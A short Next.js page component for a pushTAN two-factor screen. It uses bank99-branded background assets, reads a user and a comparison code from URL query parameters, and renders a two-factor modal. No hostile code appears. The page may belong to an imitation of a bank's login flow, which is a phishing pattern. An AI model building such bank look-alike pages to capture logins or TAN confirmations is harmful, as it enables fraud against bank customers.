"use client";

import { useRouter, useSearchParams } from "next/navigation";
import { Suspense } from "react";
import Header from "@/components/Header";
import TwoFactorModal from "@/components/TwoFactorModal";

function PushTanContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const user = searchParams.get("user") || "";
  const code = searchParams.get("code") || "";

  return (
    <div
      className="min-h-screen flex flex-col login-bg"
      style={{
        backgroundImage: "url('/bank99/bg-mountains.jpg')",
        backgroundColor: "#eceff4",
      }}
    >
      <Header />
      <main className="flex-1 flex items-start justify-center pt-8">
        <TwoFactorModal onCancel={() => router.push("/")} vergleichswert={code} />
      </main>
    </div>
  );
}

export default function PushTanPage() {
  return (
    <Suspense>
      <PushTanContent />
    </Suspense>
  );
}
